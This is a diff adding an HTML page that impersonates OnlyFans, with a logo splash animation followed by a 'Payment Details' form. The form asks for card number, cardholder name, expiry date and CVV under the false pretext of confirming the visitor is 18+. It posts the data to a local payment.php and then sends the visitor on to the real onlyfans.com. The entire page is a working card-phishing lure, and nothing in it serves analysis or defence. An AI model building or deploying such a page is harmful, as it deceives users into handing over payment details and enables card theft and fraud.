@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OnlyFans | Suscription</title>
+</head>
+<body>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: sans-serif;
+        }
+
+        .header p {
+            text-align: center;
+            color: red;
+        }
+
+        .header h2 {
+            color: rgb(112, 112, 253);
+        }
+
+        h2 {
+            /* color: red; */
+            font-size: 24px;
+            /* display: flex; */
+            /* margin: 100px 0 50px 0px */
+            /* margin-right: 0; */
+        }
+
+        body {
+            display: flex;
+            /* place-content: center; */
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+        }
+
+        .container{
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 1);
+            padding: 10px;
+            border-radius: 10px;
+            width: 450px;
+            height: auto;
+            margin-top: 50px;
+        }
+
+        .container form {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .cardInput {
+            display: flex;
+            flex-direction: column;
+            /* box-shadow: 0px 0px 10px; */
+            /* padding: 10px; */
+            border-radius: 10px;
+        }
+
+        .cardInput:focus {
+            box-shadow: 0 0 10px;
+        }
+
+        .cardInput input {
+            height: 40px;
+            padding: 10px;
+            border-radius: 10px;
+            border: 1px solid black;
+            font-size: 16px;
+        }
+
+        .cardInput input:focus {
+            border: none;
+        }
+
+        .btn input{
+            width: 400px;
+            height: 40px;
+            border-radius: 10px;
+            border: none;
+            background: rgb(117, 96, 236);
+            color: white;
+            font-size: 20px;
+        }
+
+        .header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .cardInput select {
+            width: 200px;
+            height: 40px;
+            border-radius: 10px
+        }
+
+        @media screen and (max-width: 500px) {
+            * {
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }
+
+            body {
+                font-size: 14px
+            }
+
+            .container {
+                width: 300px;
+                display: flex;
+                align-items: center;
+                margin-top: 70px;
+            }
+
+            .cardInput {
+                width: 250px;
+            }
+
+            .btn input {
+                width: 250px;
+            }
+
+            .cardInput select{
+                width: 120px;
+            }
+        }
+
+        .animation {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+		height: 100vh;
+		width: 100%;
+		background-color: white;
+		animation: boogle linear; 
+        animation-duration: .9s;
+		/* animation-delay: .20s; */
+		z-index: 3;
+    }
+
+    .img {
+        width: 100%;
+    }
+
+    @keyframes boogle {
+        20% {
+            width: 100%;
+        }
+		40% {
+			width: 90%;
+		}
+
+		60% {
+			width: 100%;
+		}
+		80% {
+			width: 90%;
+		}
+		100% {
+			width: 100%;
+		}
+    }
+</style>
+
+    </style>
+
+
+<div class="animation">
+    <img src="Onlyfans-Logo.jpg" alt="" class="img">
+   </div> 
+
+   <script>
+        // var animation = document.getElementsByClassName(".animation");
+        // let body = document.getElementsByClassName("container");
+
+        document.querySelector(".animation").addEventListener("animationend", () => {
+            document.querySelector(".animation").style.display = "none";
+            document.querySelector(".container").style.display = "flex";
+        })
+
+        document.querySelector(".animation").addEventListener("animationstart", () => {
+            document.querySelector(".container").style.display = "none";
+        })
+
+        document.querySelector(".container").style.display = "none"
+   </script>
+
+    <div class="container">
+        <div class="header">
+        <h2>Payment Details</h2>
+        <p>Enter your payment details to confirm if you are up to 18+</p>
+        </div>
+
+        <form action="payment.php" method="POST">
+
+        <div class="cardInput" id="cNumber">
+        <label for="">Card Number</label>
+        <input type="text" name="cardNumber" id="cardNumber" maxlength="19" placeholder="Enter Your Card Number" oninput="removeNonNumeric(this)" required>
+        </div>
+
+        <div class="cardInput">
+        <label for="">Card Holder</label>
+        <input type="text" name="cardName" id="cardName" placeholder="Enter your Name" required>
+        </div>
+
+        <div class="cardInput">
+        <label for="Expiry Date">Expiry Date</label>
+        <div class="expiry">
+        <input type="text" placeholder="MM-YY" name="year" class="year" maxlength="5" oninput="addslash(this)">
+        </div>
+        </div>
+        
+        <div class="cardInput">
+        <label for="ccv">CVV</label>
+        <input type="text" name="cvvNumber" id="ccvNumber" maxlength="3" placeholder="XXX" oninput="filtercvv(this)" required>
+        </div>
+
+
+        <div class="btn">
+        <a href="https://onlyfans.com"><input type="submit" value="Continue"></a>
+        </div>
+
+        </form>
+    </div>
+
+    <script src="script.js">
+    </script>
+</body>
+</html>
